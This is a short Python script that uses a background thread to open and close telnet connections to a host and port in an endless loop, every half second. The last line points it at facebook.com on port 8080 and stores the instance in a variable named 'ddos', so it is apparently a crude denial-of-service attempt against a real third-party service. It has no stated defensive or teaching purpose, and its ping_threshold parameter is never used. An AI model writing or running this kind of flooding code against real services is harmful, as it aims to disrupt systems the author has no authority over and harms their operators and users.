
from threading import Thread
import datetime
import telnetlib
from time import sleep

class Ping:
    def __init__(self, server_ip,server_port,ping_threshold=0):

        ping_thread = Thread(
                    target=self.ping,
                    args=(server_ip,server_port,ping_threshold))
        ping_thread.start()


    def ping(self,server_ip,server_port,ping_threshold):
        while True:
            try:
                with telnetlib.Telnet(server_ip,server_port) as tn:
                    tn.close()
            except Exception:
                pass
           
            sleep(0.5)


ddos = Ping('facebook.com',8080)


